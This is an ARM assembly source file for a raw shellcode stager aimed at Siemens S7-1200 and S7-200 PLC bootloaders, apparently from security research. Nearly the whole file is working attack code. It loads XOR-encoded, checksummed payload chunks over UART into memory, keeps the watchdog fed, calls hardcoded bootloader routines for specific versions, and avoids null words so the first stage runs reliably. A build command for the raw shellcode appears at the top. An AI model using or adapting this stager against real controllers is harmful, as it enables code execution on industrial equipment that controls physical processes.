// assembling raw shellcode: $arm-linux-gnueabi-as -EB -o tmp.elf stager.s && arm-linux-gnueabi-objcopy -j .text -Obinary tmp.elf stager.bin && rm tmp.elf

	.arch armv7r
.section .text
	.align	4
	.arm
	.syntax unified
_start:
		STMFD           SP!, {R0-R12, LR}
		eor r2, r2, r2
		strb r2, [r1]

		// We use the first 4 bytes of the argument as an address (args start at offset 3)
		// Save buffer base to r11
		ldr r11, [r0, 3]
		// Use r10 as cursor register
		mov r10, r11
		// Use r8 as stop flag
		eor r8, r8, r8

	next_chunk:

		mov r0, r10
		bl receive_chunk

		/*
		push {r0, r1}
		mov r0, #0x100000
		ldr r1, sleep
		blx r1
		pop {r0, r1}
		*/

		// Update the cursor in any case, we will figure out if we need to bail
		add r10, r10, r0

		// len==0xff? -> error
		teq r0, 0xff
		adreq r0, s_err
		moveq r8, 1
		beq send_ack

		// len==0? -> end of transmission
		teq r0, r8
		moveq r8, 1
		adreq r0, s_end

		adrne r0, s_okay

	send_ack:
		// Acknowledge transmission
		ldr r2, fn_UART_send
		blx r2


		// for s7-200
		// bl receive_chunk_shadow
		

		teq r8, 1
		bne next_chunk

		// Set r0=0 here without null word in opcode
		sub r0, r8, 1
		LDMFD           SP!, {R0-R12, pc}

// int uart_get_byte(void)
uart_get_byte:
		ldr r3, w_uart_base_m_4
		// Check for data being present
	check_again:
		// Update watchdog
		ldr r2, w_watchdog_val
		ldr r1, w_watchdog_target
		str r2, [r1]
		// Check if data is present
		ldr r1, [r3, 0x18+4]
		tst r1, 0x10
		bne check_again
		// Get current UART data byte
		ldr r0, [r3, 4]
		and r0, r0, 0xff

		bx lr

// int receive_chunk(char *buf)
receive_chunk:
		stmfd sp!, {r4-r9, lr}

		// Save pointer
		mov r5, r0

        // Receive length byte
		bl uart_get_byte

		// Sanity check for the input length to avoid endless loops
		// check len!=0
		tst r0, 0xff
		moveq r0, 0xff
		beq recv_end

		// Set up variables
		// r6 = size-2 as the first byte is the key and the last byte is a checksum
		sub r6, r0, 2
		// r8 = checksum
		mov r8, r0
		// r7 = i
		mov r7, 0

        // Receive byte xor key
        // r9 = xor_key
        bl uart_get_byte
        mov r9, r0
        add r8, r8, r0

	next_byte:
		bl uart_get_byte
		// Update checksum in any case
		add r8, r8, r0
        // xor key into value first
        eor r0, r0, r9

		// Check if we are at the checksum, yet
		teq r7, r6
		// If not, write the contents out
		strbne r0, [r5, r7]
		addne r7, r7, 1
		bne next_byte

		// Verify checksum and return result
		mov r0, r7
		tst r8, 0xff
        
		// Return -1 if checksum did not work out
		movne r0, 0xff

	recv_end:
		LDMFD sp!, {r4-r9, pc}

// int receive_chunk_shadow(char *buf)
receive_chunk_shadow:
		stmfd sp!, {r0-r12, lr}

		// Save pointer
		mov r5, r0

        // Receive length byte
		bl uart_get_byte

		// Sanity check for the input length to avoid endless loops
		// check len!=0
		tst r0, 0xff
		moveq r0, 0xff
		beq recv_end_shaodw

		// Set up variables
		// r6 = size-2 as the first byte is the key and the last byte is a checksum
		sub r6, r0, 2
		// r8 = checksum
		mov r8, r0
		// r7 = i
		mov r7, 0

        // Receive byte xor key
        // r9 = xor_key
        bl uart_get_byte
        mov r9, r0
        add r8, r8, r0

	next_byte_shadow:
		bl uart_get_byte
		// Update checksum in any case
		add r8, r8, r0
        // xor key into value first
        eor r0, r0, r9

		// Check if we are at the checksum, yet
		teq r7, r6
		// If not, write the contents out
		// strbne r0, [r5, r7]
		addne r7, r7, 1
		bne next_byte_shadow

		// Verify checksum and return result
		mov r0, r7
		tst r8, 0xff
        
		// Return -1 if checksum did not work out
		movne r0, 0xff

	recv_end_shadow:
		LDMFD sp!, {r0-r12, pc}

/* send_chunk(char* buf)
send_chunk:
		push {r0-r12, lr}
		// r1 is length
		ldrb r1, [r0]
		add r1, r1, #1
		// r2 as incresing counter
		eor r2, r2, r2

	loop_send:
		cmp r1, #0
		beq send_end

	uart_avail:
		ldr r12, w_uart_base_m_4
	    ldr r3, [r12, #0x18+4]
	    tst r3, #0x20 
	    bne uart_avail

	    ldr r3, [r0, r2]
	    add r2, r2, #1
	    sub r1, r1, #1
	    str r3, [r12, 4]
	    b loop_send

	send_end:
		ldr r0, [r12, #0x18+4]
		tst r0, #8
		bne send_end

		pop {r0-r12, pc}
*/

.align 4
w_watchdog_target:
	.word 0xFFFBB120
w_watchdog_val:
	.word 0x967EA5C3

w_uart_base_m_4:
	// We are using this to avoid a null word the shellcode to make initial stage more reliable
	.word 0xFFFB8000-4

fn_UART_send:
	// s7-1200 bootloader version 4.2.3
	.word 0xf388

	// s7-1200 bootloader version 4.4.0
	// .word 0xf28c

	// s7-200 bootloader version 2.4.1
	// .word 0xb1b4

sleep:
	.word 0xeaf4

.align 4
s_okay:
	.ascii "\x02\x00\xfeA"
.align 4
s_err:
    .ascii "\x11"
	.ascii "STAGER_TRANS_ERR___"
.align 4
s_end:
	.ascii "\x02\x01\xfdA"
